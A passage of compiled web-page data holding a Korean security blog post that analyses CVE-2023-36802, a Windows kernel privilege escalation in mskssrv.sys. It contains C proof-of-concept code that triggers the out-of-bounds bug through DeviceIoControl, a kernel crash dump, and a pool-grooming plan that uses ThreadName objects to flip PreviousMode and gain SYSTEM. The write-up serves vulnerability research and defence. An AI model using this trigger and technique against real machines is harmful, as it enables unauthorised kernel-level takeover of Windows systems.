_jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"NULL\"\n        }), \"\\n  );\\n  \\n  \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"PCHAR\"\n        }), \" inputBuffer = (\", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"PCHAR\"\n        }), \")\", _jsx(_components.span, {\n          className: \"hljs-title function_\",\n          children: \"malloc\"\n        }), \"(inputsize);\\n  \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"PCHAR\"\n        }), \" outputBuffer = (\", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"PCHAR\"\n        }), \")\", _jsx(_components.span, {\n          className: \"hljs-title function_\",\n          children: \"malloc\"\n        }), \"(outputsize);\\n  \\n  \", _jsx(_components.span, {\n          className: \"hljs-title function_\",\n          children: \"printf\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"\\\"[+] Initialize Rendezvous\\\\n\\\"\"\n        }), \");\\n  \", _jsx(_components.span, {\n          className: \"hljs-title function_\",\n          children: \"memset\"\n        }), \"(inputBuffer, \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0\"\n        }), \", inputsize);\\n  *(\", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"DWORD\"\n        }), \"*)(inputBuffer + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x00\"\n        }), \") = \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0xffffffff\"\n        }), \"; \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// &1 == Non ZERO\"\n        }), \"\\n  *(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"DWORD64\"\n        }), \"*)(inputBuffer + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x08\"\n        }), \") = \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"GetCurrentProcessId\"\n        }), \"(); \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// Current Process ID\"\n        }), \"\\n  *(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"DWORD64\"\n        }), \"*)(inputBuffer + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x10\"\n        }), \") = \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x4343434344444444\"\n        }), \"; \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// Some Marker\"\n        }), \"\\n  *(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"DWORD64\"\n        }), \"*)(inputBuffer + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x18\"\n        }), \") = \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0\"\n        }), \"; \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// 0\"\n        }), \"\\n  ntstatus = \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"DeviceIoControl\"\n        }), \"(hDevice, \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x2F0400\"\n        }), \", inputBuffer, inputsize, outputBuffer, outputsize, \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"NULL\"\n        }), \", \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"NULL\"\n        }), \"); \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// FSInitializeContextRendezvous\"\n        }), \"\\n  \\n  \", _jsx(_components.span, {\n          className: \"hljs-title function_\",\n          children: \"printf\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"\\\"[+] Publish RX --> Trigger OOB Access Vulnerability\\\\n\\\"\"\n        }), \");\\n  \", _jsx(_components.span, {\n          className: \"hljs-title function_\",\n          children: \"memset\"\n        }), \"(inputBuffer, \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0\"\n        }), \", inputsize);\\n  *(\", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"DWORD\"\n        }), \"*)(inputBuffer + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x20\"\n        }), \") = \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"1\"\n        }), \"; \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// maxCnt\"\n        }), \"\\n  *(\", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"DWORD\"\n        }), \"*)(inputBuffer + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x24\"\n        }), \") = \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"1\"\n        }), \"; \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// CNT <= maxCnt \"\n        }), \"\\n  *(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"DWORD64\"\n        }), \"*)(inputBuffer + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x30\"\n        }), \") = \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0\"\n        }), \"; \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// Some Value\"\n        }), \"\\n  ntstatus = \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"DeviceIoControl\"\n        }), \"(hDevice, \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x2F040C\"\n        }), \", inputBuffer, inputsize, outputBuffer, outputsize, \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"NULL\"\n        }), \", \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"NULL\"\n        }), \"); \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// PublishRx\"\n        }), \"\\n}\\n\"]\n      })\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"mskssrv.sys에서 verifier가 활성화되어 있는 경우 충돌이 발생할 수 있습니다.\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.pre, {\n      children: _jsxs(_components.code, {\n        className: \"hljs language-js\",\n        children: [_jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"1\"\n        }), \": kd> r\\nrax=ffffd5019f2d1668 rbx=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0000000000000000\"\n        }), \" rcx=ffffbf8b77206f80\\nrdx=ffffbf8b76e02b00 rsi=ffffbf8b77206f80 rdi=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0000000000000000\"\n        }), \"\\nrip=fffff80ffac9c9f7 rsp=ffffd5019f2d1610 rbp=ffffbf8b77045e78\\n r8=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0000000000000001\"\n        }), \"  r9=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0000000000000001\"\n        }), \" r10=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0000000000000000\"\n        }), \"\\nr11=ffffffffffffffff r12=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0000000000000000\"\n        }), \" r13=ffffbf8b76d60cd0\\nr14=ffffbf8b77207108 r15=ffffbf8b76e02b00\\niopl=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0\"\n        }), \"         nv up ei pl nz na pe nc\\ncs=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0010\"\n        }), \"  ss=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0018\"\n        }), \"  ds=002b  es=002b  fs=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0053\"\n        }), \"  gs=002b             efl=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"00040202\"\n        }), \"\\n\", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"MSKSSRV\"\n        }), \"!\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"PublishRx\"\n        }), \"+\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x43\"\n        }), \":\\nfffff80f\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`fac9c9f7 4d3936          cmp     qword ptr [r14],r14 ds:002b:ffffbf8b`\"\n        }), _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"77207108\"\n        }), \"=????????????????\\n\\n\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"1\"\n        }), \": kd> dq @rcx \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"L18\"\n        }), \"\\nffffbf8b\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`77206f80  fffff80f`\"\n        }), \"fac941b8 ffffbf8b\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`77204fe0\\nffffbf8b`\"\n        }), \"77206f90  ffffbf8b\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`77204fe0 00000000`\"\n        }), _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"00000002\"\n        }), \"\\nffffbf8b\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`77206fa0  ffffbf8b`\"\n        }), \"77206f80 \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"00000000\"\n        }), _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`00000001\\nffffbf8b`\"\n        }), \"77206fb0  \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"00000078\"\n        }), _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`00000001 ffffbf8b`\"\n        }), \"7681f300\\nffffbf8b\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`77206fc0  00000000`\"\n        }), _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"00000000\"\n        }), \" ffffbf8b\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`77204fd0\\nffffbf8b`\"\n        }), \"77206fd0  \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"00000000\"\n        }), _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`00000001 00000000`\"\n        }), \"00001b80\\nffffbf8b\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`77206fe0  43434343`\"\n        }), _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"44444444\"\n        }), \" \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"00000000\"\n        }), _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`00000000\\nffffbf8b`\"\n        }), \"77206ff0  \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"00000000\"\n        }), _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`00000000 b3b3b3b3`\"\n        }), \"b3b3b3b3\\nffffbf8b\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`77207000  ????????`\"\n        }), \"???????? ????????\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`????????\\nffffbf8b`\"\n        }), _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"77207010\"\n        }), \"  ????????\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`???????? ????????`\"\n        }), \"????????\\nffffbf8b\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`77207020  ????????`\"\n        }), \"???????? ????????\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`????????\\nffffbf8b`\"\n        }), _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"77207030\"\n        }), \"  ????????\", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"`???????? ????????`\"\n        }), \"????????\\n\\n\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"1\"\n        }), \": kd> pr\\n\", _jsx(_components.span, {\n          className: \"hljs-attr\",\n          children: \"KDTARGET\"\n        }), \": \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Refreshing\"\n        }), \" \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"KD\"\n        }), \" connection\\n\\n*** \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Fatal\"\n        }), \" \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"System\"\n        }), \" \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Error\"\n        }), \": \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x00000050\"\n        }), \"\\n                       (\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0xFFFFBF8B77207108\"\n        }), \",\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x0000000000000000\"\n        }), \",\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0xFFFFF80FFAC9C9F7\"\n        }), \",\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x0000000000000002\"\n        }), \")\\n\\n\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Driver\"\n        }), \" at \", _jsx(_components.span, {\n          className: \"hljs-attr\",\n          children: \"fault\"\n        }), \": \\n***   \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"MSKSSRV\"\n        }), \".\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"sys\"\n        }), \" - \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Address\"\n        }), \" \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FFFFF80FFAC\"\n        }), \"9C9F7 base at \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FFFFF80FFAC\"\n        }), \"90000, \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"DateStamp\"\n        }), \" 75a6d2bb\\n.\\n\\nA fatal system error has occurred.\\n\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Debugger\"\n        }), \" entered on first \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"try\"\n        }), \"; \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Bugcheck\"\n        }), \" callbacks have not been invoked.\\n\\nA fatal system error has occurred.\\n\\nrax=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0000000000000000\"\n        }), \" rbx=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0000000000000003\"\n        }), \" rcx=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0000000000000003\"\n        }), \"\\nrdx=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0000000000000070\"\n        }), \" rsi=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0000000000000000\"\n        }), \" rdi=ffffd70001988180\\nrip=fffff800470171e0 rsp=ffffd5019f2d0a28 rbp=ffffd5019f2d0b90\\n r8=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0000000000000065\"\n        }), \"  r9=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0000000000000000\"\n        }), \" r10=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0000000000000000\"\n        }), \"\\nr11=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0000000000000010\"\n        }), \" r12=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0000000000000003\"\n        }), \" r13=ffffbf8b77207108\\nr14=\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"000000\"\n        }), \"\\n\"]\n      })\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"FSStreamReg::PublishRx 함수는 적절한 FrameMDL 객체를 찾기 위해 0x188과 0x198 Offset에 접근합니다. 0x188과 0x198 오프셋은 경종 영역(out-of-bound area)에 있으므로, 제어 가능한 값을 넣을 수 있습니다. 따라서 조건을 쉽게 만족시킬 수 있고 임의의 감소 코드를 실행할 수 있습니다([*]). ObfDereferenceObject 함수는 이 위치에 있는 객체의 참조 횟수를 감소시킬 것입니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"그러나 장애물이 있었습니다. FSContextReg 객체의 크기는 풀 헤더(0x10 바이트)를 포함해 0x90 바이트이므로, LFH (Low Fragmented Heap)를 사용할 것입니다. 이는 0x90 바이트를 할당하여 메모리 레이아웃을 생성해야 함을 의미합니다. 메모리 레이아웃을 만들기 위해 네임드 파이프 객체를 사용할 수 있습니다. 네임드 파이프 객체는 NonPagedPool을 위한 취약점을 이용하기 위해 널리 사용됩니다. 왜냐하면 FSContextReg는 NonPagedPool에 할당되기 때문입니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"메모리 레이아웃이 네임드 파이프 객체에 의해 조작되면, 아래와 같이 됩니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: _jsx(_components.img, {\n        src: \"/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_1.png\",\n        alt: \"이미지\"\n      })\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"위 그림에서와 같이 사용자가 제어할 수 없는 네임드 파이프 개체의 헤더 영역에는 오프셋 0x1C8이 있습니다. 이 문제를 해결하기 위해 이 상황에 적합한 다른 적절한 개체를 찾아보았고, ThreadName 개체를 발견했습니다.\"\n    }), \"\\n\", _jsx(_components.pre, {\n      children: _jsxs(_components.code, {\n        className: \"hljs language-js\",\n        children: [_jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"NTSTATUS\"\n        }), \" __stdcall \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"NtSetInformationThread\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"HANDLE\"\n        }), \" \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadHandle\"\n        }), \", \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"THREADINFOCLASS\"\n        }), \" \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadInformationClass\"\n        }), \", \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"PVOID\"\n        }), \" \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadInformation\"\n        }), \", \", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"ULONG\"\n        }), \" \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadInformationLength\"\n        }), \")\\n{\\n  ...\\n  \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"switch\"\n        }), \" (\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadInformationClass\"\n        }), \")\\n    ...\\n    \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"case\"\n        }), \" \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadNameInformation\"\n        }), \":\\n      \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" (\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadInformationLength\"\n        }), \" == \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"16\"\n        }), \")\\n      {\\n        result = \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ObReferenceObjectByHandleWithTag\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadHandle\"\n        }), \", 0x400u, (\", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"POBJECT_TYPE\"\n        }), \")\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"PsThreadType\"\n        }), \", prev_mode, 0x79517350u, &\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadObj\"\n        }), \", 0i64);\\n        ...\\n        \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// 사용자 주소 유효성 검사 ~~~\"\n        }), \"\\n        *(\", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"UNICODE_STRING\"\n        }), \" *)\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadName\"\n        }), \"_Unicode = *(\", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"UNICODE_STRING\"\n        }), \" *)\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadInformation\"\n        }), \";\\n        ...\\n        \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// [1]. 임의 크기의 Non-Paged Pool 할당\"\n        }), \"\\n        \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"NameMem\"\n        }), \" = (char *)\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ExAllocatePoolWithTag\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"NonPagedPoolNx\"\n        }), \", \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadName\"\n        }), \"_Unicode.\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"Length\"\n        }), \" + 16i64, 0x6D4E6854u);\\n        \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadName\"\n        }), \" = (_UNICODE_STRING *)\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"NameMem\"\n        }), \";\\n        \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" (\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadName\"\n        }), \")\\n        {\\n          \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// [2]. 사용자 데이터 시작 위치 +0x10\"\n        }), \"\\n          \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"NameArea\"\n        }), \" = (wchar_t *)(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"NameMem\"\n        }), \" + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0x10\"\n        }), \");\\n          \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadName\"\n        }), \"->\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Buffer\"\n        }), \" = \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"NameArea\"\n        }), \";\\n          \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadName\"\n        }), \"->\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"Length\"\n        }), \" = \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadName\"\n        }), \"_Unicode.\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"Length\"\n        }), \";\\n          \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadName\"\n        }), \"->\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"MaximumLength\"\n        }), \" = \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadName\"\n        }), \"_Unicode.\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"Length\"\n        }), \";\\n          \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// 사용자 데이터를 메모리로 복사\"\n        }), \"\\n          \", _jsx(_components.span, {\n          className: \"hljs-title function_\",\n          children: \"memmove\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"NameArea\"\n        }), \", \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadName\"\n        }), \"_Unicode.\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"Buffer\"\n        }), \", \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadName\"\n        }), \"_Unicode.\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"Length\"\n        }), \");\\n          ...\\n          \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"OldName\"\n        }), \" = \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadObj\"\n        }), \"->\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadName\"\n        }), \";\\n          \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadObj\"\n        }), \"->\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadName\"\n        }), \" = \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ThreadName\"\n        }), \";\\n          ...\\n          \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// 이전 이름의 메모리를 해제합니다.\"\n        }), \"\\n          \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" (\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"OldName\"\n        }), \")\\n            \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"ExFreePoolWithTag\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"OldName\"\n        }), \", 0x6D4E6854u);\\n          ...\\n        }\\n      }\\n  ...\\n}\\n\"]\n      })\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"ThreadName은 ThreadNameInformation(0x26)을 사용하여 NtSetInformationThread 시스템 호출을 통해 설정할 수 있습니다. 이 개체는 원하는 크기로 NonPagedPool에 할당되며, 이 개체의 데이터는 처음 0x10바이트를 제외하고 완전히 제어 가능합니다 ([2]). 게다가, ThreadName 개체를 해제하는 코드도 있어서 홀을 만드는 데 유용합니다 ([8]).\"\n    }), \"\\n\", _jsx(\"img\", {\n      src: \"/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_2.png\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"이 객체를 사용하면 오프셋 0x188 및 0x1C8의 값을 완전히 처리하고 임의의 감소를 성공적으로 발생시킬 수 있습니다. 이 임의의 감소 기본 원리를 통해 현재 스레드 개체의 PreviousMode를 사용자(1)에서 커널(0)으로 변경할 수 있습니다. 여기서 커널 스레드 권한으로 권한 상승을 위한 잘 알려진 방법을 사용할 수 있습니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"Fermium-252: 사이버 위협 인텔리전스 데이터베이스에는 PoC 및 익스플로잇 코드를 비롯한 자세한 정보가 있습니다. Fermium-252 서비스에 관심이 있다면 contacts@theori.io로 문의하십시오.\"\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"결론\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"이 게시물에서는 우리의 1일 완전한 체인 익스플로잇의 마지막 시리즈인 CVE-2023-36802의 분석을 제공했습니다. 이 블로그 시리즈가 끝나더라도 우리는 항상 세계의 위협을 분석하고 다른 흥미로운 연구 주제의 다른 블로그 게시물로 돌아올 것입니다.\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"참고 자료\"\n    }), \"\\n\", _jsxs(_components.ul, {\n      children: [\"\\n\", _jsx(_components.li, {\n        children: _jsx(_components.a, {\n          href: \"https://github.com/chompie1337/Windows_MSKSSRV_LPE_CVE-2023-36802\",\n          children: \"chompie1337의 GitHub 페이지\"\n        })\n      }), \"\\n\", _jsx(_components.li, {\n        children: _jsx(_components.a, {\n          href: \"https://github.com/Nero22k/cve-2023-36802\",\n          children: \"Nero22k의 GitHub 페이지\"\n        })\n      }), \"\\n\", _jsx(_components.li, {\n        children: _jsx(_components.a, {\n          href: \"https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/\",\n          children: \"보안 인텔리전스 기사\"\n        })\n      }), \"\\n\", _jsx(_components.li, {\n        children: _jsx(_components.a, {\n          href: \"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2023-36802\",\n          children: \"Microsoft 보안 업데이트 - CVE-2023-36802\"\n        })\n      }), \"\\n\", _jsx(_components.li, {\n        children: _jsx(_components.a, {\n          href: \"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2023/CVE-2023-36802.html\",\n          children: \"Google Project Zero의 보고서\"\n        })\n      }), \"\\n\"]\n    }), \"\\n\", _jsxs(_components.p, {\n      children: [\"🔵 웹사이트: \", _jsx(_components.a, {\n        href: \"https://theori.io\",\n        children: \"theori.io\"\n      }), \" ✉️ 이메일: vr@theori.io\"]\n    })]\n  });\n}\nfunction MDXContent(props = {}) {\n  const {wrapper: MDXLayout} = Object.assign({}, _provideComponents(), props.components);\n  return MDXLayout ? _jsx(MDXLayout, Object.assign({}, props, {\n    children: _jsx(_createMdxContent, props)\n  })) : _createMdxContent(props);\n}\nreturn {\n  default: MDXContent\n};\n","frontmatter":{},"scope":{}}},"__N_SSG":true}